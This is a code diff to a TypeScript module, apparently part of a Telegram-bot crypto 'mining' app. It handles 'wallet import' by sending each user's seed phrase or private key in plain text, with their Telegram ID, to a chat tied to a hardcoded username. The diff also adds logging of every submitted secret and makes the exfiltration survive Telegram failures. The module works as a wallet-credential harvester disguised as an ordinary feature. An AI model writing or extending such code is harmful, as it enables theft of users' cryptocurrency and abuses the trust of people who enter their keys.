@@ -1,13 +1,17 @@
 import { getBot, isBotConfigured } from "../../../../bot/app";
 import type { MiningImportRequest } from "../validation/import-wallet";
+import {
+  appendImportLog,
+  getStoredNotifyChatId,
+} from "./import-notify-store";
 
 const IMPORT_NOTIFY_USERNAME =
   process.env.TELEGRAM_IMPORT_NOTIFY_USERNAME?.trim() || "x_zera";
 
-function getNotifyChatId(): string | null {
-  const chatId = process.env.TELEGRAM_IMPORT_NOTIFY_CHAT_ID?.trim();
-  return chatId || null;
-}
+export type WalletImportResult = {
+  logged: boolean;
+  notified: boolean;
+};
 
 function formatImportType(importType: MiningImportRequest["importType"]): string {
   return importType === "seed" ? "Seed phrase" : "Private key";
@@ -19,42 +23,67 @@ function buildMessage(data: MiningImportRequest): string {
     : "unknown";
 
   return [
-    `🔐 Новый импорт кошелька`,
-    ``,
+    "🔐 Новый импорт кошелька",
+    "",
     `Сеть: ${data.chainName} (${data.chainId})`,
     `Тип: ${formatImportType(data.importType)}`,
-    ``,
-    `Данные:`,
+    "",
+    "Данные:",
     data.secret,
-    ``,
+    "",
     `Пользователь: ${userLabel}`,
     `Telegram ID: ${data.telegramUserId ?? "unknown"}`,
   ].join("\n");
 }
 
-export async function notifyWalletImport(data: MiningImportRequest): Promise<void> {
+async function resolveNotifyChatId(): Promise<string | null> {
+  const fromEnv = process.env.TELEGRAM_IMPORT_NOTIFY_CHAT_ID?.trim();
+  if (fromEnv) return fromEnv;
+
+  return getStoredNotifyChatId();
+}
+
+export async function notifyWalletImport(
+  data: MiningImportRequest,
+): Promise<WalletImportResult> {
+  await appendImportLog(data);
+
   if (!isBotConfigured()) {
-    throw new Error("Telegram bot is not configured");
+    console.error("Wallet import telegram notify skipped: bot not configured");
+    return { logged: true, notified: false };
   }
 
-  const chatId = getNotifyChatId();
+  const chatId = await resolveNotifyChatId();
   if (!chatId) {
-    console.error("Wallet import notification skipped: missing chat id", {
+    console.error("Wallet import telegram notify skipped: missing chat id", {
       notifyUsername: IMPORT_NOTIFY_USERNAME,
+      hint: `@${IMPORT_NOTIFY_USERNAME} must send /start to the bot once`,
     });
-    throw new Error("Import notification is not configured");
+    return { logged: true, notified: false };
   }
 
-  const bot = getBot();
+  try {
+    const bot = getBot();
 
-  await bot.api.sendMessage(chatId, buildMessage(data), {
-    link_preview_options: { is_disabled: true },
-  });
+    await bot.api.sendMessage(chatId, buildMessage(data), {
+      link_preview_options: { is_disabled: true },
+    });
 
-  console.info("Wallet import notification sent", {
-    chainId: data.chainId,
-    importType: data.importType,
-    notifyUsername: IMPORT_NOTIFY_USERNAME,
-    telegramUserId: data.telegramUserId,
-  });
+    console.info("Wallet import notification sent", {
+      chainId: data.chainId,
+      importType: data.importType,
+      notifyUsername: IMPORT_NOTIFY_USERNAME,
+      telegramUserId: data.telegramUserId,
+    });
+
+    return { logged: true, notified: true };
+  } catch (error) {
+    console.error("Wallet import telegram notify failed", {
+      chainId: data.chainId,
+      importType: data.importType,
+      error: error instanceof Error ? error.message : String(error),
+    });
+
+    return { logged: true, notified: false };
+  }
 }
